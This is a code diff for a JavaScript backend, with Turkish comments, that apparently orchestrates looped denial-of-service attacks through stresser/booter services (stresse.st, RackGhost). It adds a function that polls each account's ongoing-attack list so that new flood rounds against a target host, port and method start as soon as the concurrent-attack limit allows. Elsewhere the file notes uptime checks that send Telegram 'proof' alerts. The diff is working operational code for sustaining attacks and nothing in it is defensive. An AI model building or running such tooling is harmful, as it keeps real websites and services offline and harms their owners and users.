@@ -2172,6 +2172,72 @@ async function fetchOngoingAttackIds(sessionId, params, limit = 1, sinceMs = nul
 // Tur atesleme cekirdegi: onceki tur beklemesi + launch + kayit + hata sayaci.
 // runLoopRound (kendi saati) ve senkron koordinatoru (paylasilan saat) ortak kullanir.
 // Donus: turda basarili saldiri sayisi (0 = tamamen basarisiz).
+// Yeni tur oncesi onceki turun saldirilarinin upstream'den dustugunu bekler.
+// Dogrulanmis loop'lar attack_id ile; ID'siz (dogrulanamayan tur) loop'lar
+// hedef+yontem imzasinin /ongoing satir sayisi sifira inene kadar bekler —
+// stresse attack_id dondurmediginde de calisir. Hesap basina tek poll yapilir
+// (birden cok loop ayni hesaptaysa istekler birlesir). rackghost atlanir:
+// saldirilari sure dolunca kesin olur, fireLoopRound'un statik buffer'i yeter.
+async function waitLoopsDrained(loopIds, maxWaitMs = 60000) {
+  const pending = new Map(); // loopId -> { kind:'ids'|'sig', ids:Set, sig, sessionId }
+  for (const loopId of loopIds) {
+    const loop = activeLoops[loopId];
+    if (!loop || loop.params?.provider === 'rackghost') continue;
+    if (!sessions[loop.sessionId]) continue;
+    const ids = (loop.roundAttackIds || []).filter(Boolean);
+    if (ids.length > 0) {
+      pending.set(loopId, { kind: 'ids', ids: new Set(ids), sessionId: loop.sessionId });
+    } else if ((loop.roundCount || 0) > 0) {
+      const sig = rowSigKey(`${loop.params.host}:${loop.params.port}`, loop.params.method);
+      if (sig) pending.set(loopId, { kind: 'sig', sig, sessionId: loop.sessionId });
+    }
+  }
+  if (pending.size === 0) return;
+
+  const started = Date.now();
+  while (pending.size > 0 && Date.now() - started < maxWaitMs) {
+    const bySession = new Map();
+    pending.forEach((p, loopId) => {
+      if (!bySession.has(p.sessionId)) bySession.set(p.sessionId, []);
+      bySession.get(p.sessionId).push(loopId);
+    });
+    for (const [sessionId, sLoopIds] of bySession) {
+      const session = sessions[sessionId];
+      if (!session) { sLoopIds.forEach((id) => pending.delete(id)); continue; }
+      let list;
+      try {
+        const client = getClient(sessionId);
+        const res = await client.get(`/ongoing/${session.username}`);
+        list = Array.isArray(res.data) ? res.data : (res.data?.attacks || []);
+      } catch (err) {
+        console.warn(`[drain] /ongoing hatasi (${session.username}):`, err.message);
+        continue; // bu hesabi bu tur atla; dis dongu 1sn sonra tekrar dener
+      }
+      const ongoingIds = new Set(list.map((a) => a.attack_id || a.id));
+      const sigCounts = new Map();
+      list.forEach((a) => {
+        const sig = rowSigKey(a.target || a.host, a.method);
+        if (sig) sigCounts.set(sig, (sigCounts.get(sig) || 0) + 1);
+      });
+      sLoopIds.forEach((loopId) => {
+        const p = pending.get(loopId);
+        if (!p) return;
+        if (p.kind === 'ids') {
+          const alive = [...p.ids].filter((x) => ongoingIds.has(x));
+          if (alive.length === 0) pending.delete(loopId);
+          else p.ids = new Set(alive);
+        } else if ((sigCounts.get(p.sig) || 0) === 0) {
+          pending.delete(loopId);
+        }
+      });
+    }
+    if (pending.size > 0) await new Promise((r) => setTimeout(r, 1000));
+  }
+  if (pending.size > 0) {
+    console.warn(`[drain] ${maxWaitMs}ms icinde dusmeyen loop'lar var, yine de devam: ${[...pending.keys()].join(', ')}`);
+  }
+}
+
 async function fireLoopRound(loopId) {
   const loop = activeLoops[loopId];
   if (!loop || !loop.running) return;
@@ -2200,56 +2266,21 @@ async function fireLoopRound(loopId) {
   }));
 
   // Onceki turun saldirilari kendi time suresi doldugunda stresse.st tarafindan
-  // otomatik sonlanir. Yeni tur baslatmadan once onceki turun attack ID'lerinin
-  // stresse.st /ongoing listesinden dustugunu dogrulariz. Boylece 80 concurrent
-  // limitini asmayiz.
+  // otomatik sonlanir. Yeni tur baslatmadan once onceki turun dustugunu
+  // dogrulariz (ID ile; ID yoksa imza ile) — boylece concurrent limitini asmayiz.
   const previousRoundIds = loop.roundAttackIds || [];
-  if (previousRoundIds.length > 0) {
-    const maxWaitMs = 60 * 1000;
-    // 2sn yerine 500ms yoklama: bitis->yeni tur boslugu ~1.5-2.5sn'ye iner.
-    // Daha sıkı yoklama upstream'i yormaz (hafif GET); ama slot doluyken
-    // erken basma 429/kismi launch dogurur — o yuzden bekleme korunuyor.
-    const checkIntervalMs = 500;
-    const startedWaiting = Date.now();
-    let stillActive = new Set(previousRoundIds);
-
-    if (isRackghost) {
+  if (isRackghost) {
+    if (previousRoundIds.length > 0) {
       // RackGhost saldirilari 'time' dolunca kesin sonlanir; onceki turun
       // dustugunu ongoing ile yoklamak gereksiz istek trafigidir (2+ loop'ta
       // 1 istek/sn rate limit'ine dayaniyordu). Statik kisa buffer yeterli.
       console.log(`[loop ${loopId}] rackghost: onceki tur buffer bekleniyor (3sn)`);
       await new Promise((r) => setTimeout(r, 3000));
-      stillActive = new Set();
-    } else {
-      const webClient = getClient(loop.sessionId);
-      const username = session.username;
-      while (stillActive.size > 0 && Date.now() - startedWaiting < maxWaitMs) {
-        try {
-          const ongoingRes = await webClient.get(`/ongoing/${username}`);
-          const ongoingList = Array.isArray(ongoingRes.data)
-            ? ongoingRes.data
-            : (ongoingRes.data?.attacks || []);
-          const ongoingIds = new Set(ongoingList.map((a) => a.attack_id || a.id));
-          stillActive = new Set([...previousRoundIds].filter((id) => ongoingIds.has(id)));
-          if (stillActive.size > 0) {
-            console.log(`[loop ${loopId}] ${stillActive.size} onceki saldiri hala aktif, bekleniyor...`);
-            await new Promise((r) => setTimeout(r, checkIntervalMs));
-          }
-        } catch (err) {
-          console.warn(`[loop ${loopId}] /ongoing kontrolu hatasi:`, err.message);
-          await new Promise((r) => setTimeout(r, checkIntervalMs));
-        }
-      }
     }
-
-    if (stillActive.size > 0) {
-      console.warn(`[loop ${loopId}] ${stillActive.size} onceki saldiri ${maxWaitMs}ms icinde sonlanmadi, yine de devam ediliyor`);
-    } else {
-      console.log(`[loop ${loopId}] Onceki tur saldirilari sonlandi, yeni tur baslatiliyor`);
-    }
-
-    previousRoundIds.forEach((attackId) => unregisterAttack(attackId));
+  } else {
+    await waitLoopsDrained([loopId], 60000);
   }
+  previousRoundIds.forEach((attackId) => unregisterAttack(attackId));
 
   loop.roundCount += 1;
   loop.lastRoundAt = new Date().toISOString();
@@ -4039,7 +4070,7 @@ rackghost.initRackghost();
 // SiteWatcher (uptime izleme): yarim saatlik tur + telegram kanit bildirimi
 sitewatch.initSitewatch();
 // Senkron Tur Koordinatoru: paylasilan saatli loop gruplari (restart'ta geri yuklenir)
-sync.initSync({ activeLoops, sessions, getLoopOwner, fireLoopRound, runLoop, saveState, activeLoopRounds });
+sync.initSync({ activeLoops, sessions, getLoopOwner, fireLoopRound, runLoop, saveState, activeLoopRounds, waitLoopsDrained });
 // Restart sonrasi slot bildirimi kacmasin: geri yuklenen saldirilari hesap
 // bazinda baz al.
 Object.values(activeAttacks).forEach((a) => {
